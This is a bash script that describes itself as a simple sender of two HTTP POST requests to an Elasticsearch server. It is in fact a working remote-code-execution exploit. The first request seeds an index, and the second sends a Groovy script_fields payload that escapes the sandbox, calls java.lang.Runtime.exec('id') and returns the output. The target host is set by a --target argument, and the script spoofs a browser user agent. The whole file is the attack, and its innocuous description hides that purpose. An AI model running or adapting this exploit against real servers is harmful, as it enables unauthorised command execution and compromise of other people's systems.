#!/bin/bash

# Script Name: send_requests.sh
# Description: Sends two HTTP POST requests to an Elasticsearch server using curl.
#              The second request is sent after a specified delay following the first.
# Author: Suyue Guo
# Date: 2024-11-04

# ------------------------------
# Configuration Variables
# ------------------------------

# Replace 'your-ip' with the actual IP address or hostname of your Elasticsearch server.
HOST="127.0.0.1"
PORT="9200"

# Common User-Agent string to mimic a specific browser.
USER_AGENT="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"

# Duration to wait between the first and second requests (in seconds).
SLEEP_DURATION=3  # Modify this value as needed.


# ------------------------------
# Function to Display Usage
# ------------------------------
usage() {
  echo "Usage: $0 --target <HOST> [--port <PORT>] [--sleep <SECONDS>]"
  echo
  echo "Options:"
  echo "  --target    The target host (required)"
  echo "  --port      The target port (default: 9200)"
  echo "  --sleep     Sleep duration between requests in seconds (default: 3)"
  echo "  -h, --help  Display this help message"
  exit 1
}

# ------------------------------
# Parse Command Line Arguments
# ------------------------------
while [[ $# -gt 0 ]]; do
  case "$1" in
    --target)
      if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
        HOST="$2"
        shift 2
      else
        echo "Error: --target requires a non-empty argument."
        usage
      fi
      ;;
    --port)
      if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
        PORT="$2"
        shift 2
      else
        echo "Error: --port requires a non-empty argument."
        usage
      fi
      ;;
    --sleep)
      if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
        SLEEP_DURATION="$2"
        shift 2
      else
        echo "Error: --sleep requires a non-empty argument."
        usage
      fi
      ;;
    -h|--help)
      usage
      ;;
    *)
      echo "Error: Unknown option $1"
      usage
      ;;
  esac
done

# Validate that HOST is set
if [[ -z "$HOST" ]]; then
  echo "Error: --target is required."
  usage
fi


# ------------------------------
# First HTTP POST Request
# ------------------------------

# Endpoint: POST /website/blog/
URL1="http://$HOST:$PORT/website/blog/"

# Headers for the first request
HEADER_ACCEPT="Accept: */*"
HEADER_ACCEPT_LANGUAGE="Accept-Language: en"
HEADER_CONNECTION="Connection: close"
HEADER_CONTENT_TYPE_JSON="Content-Type: application/json"

# Data payload for the first request
DATA1='{
  "name": "test"
}'

# Sending the first HTTP POST request
echo "Sending first POST request to $URL1"
curl -X POST "$URL1" \
  -H "$HEADER_ACCEPT" \
  -H "$HEADER_ACCEPT_LANGUAGE" \
  -H "User-Agent: $USER_AGENT" \
  -H "$HEADER_CONNECTION" \
  -H "$HEADER_CONTENT_TYPE_JSON" \
  -d "$DATA1"

# Check if the first request was successful
if [ $? -eq 0 ]; then
  echo -e "\nFirst POST request completed successfully."
else
  echo -e "\nFirst POST request failed."
  exit 1  # Exit the script if the first request fails
fi

# ------------------------------
# Delay Before Second Request
# ------------------------------

echo "Waiting for $SLEEP_DURATION seconds before sending the second POST request..."
sleep "$SLEEP_DURATION"

# ------------------------------
# Second HTTP POST Request
# ------------------------------

# Endpoint: POST /_search?pretty
URL2="http://$HOST:$PORT/_search?pretty"

# Headers for the second request
HEADER_CONTENT_TYPE_TEXT="Content-Type: application/text"

# Data payload for the second request
# Note: The script includes escaped double quotes to ensure proper JSON formatting.
DATA2='{
  "size": 1,
  "script_fields": {
    "lupin": {
      "lang": "groovy",
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}'

# Sending the second HTTP POST request
echo "Sending second POST request to $URL2"
curl -X POST "$URL2" \
  -H "$HEADER_ACCEPT" \
  -H "$HEADER_ACCEPT_LANGUAGE" \
  -H "User-Agent: $USER_AGENT" \
  -H "$HEADER_CONNECTION" \
  -H "$HEADER_CONTENT_TYPE_TEXT" \
  -d "$DATA2"

# Check if the second request was successful
if [ $? -eq 0 ]; then
  echo -e "\nSecond POST request completed successfully."
else
  echo -e "\nSecond POST request failed."
  exit 1  # Exit the script if the second request fails
fi

# ------------------------------
# Script Completion
# ------------------------------

echo "All POST requests have been sent successfully."

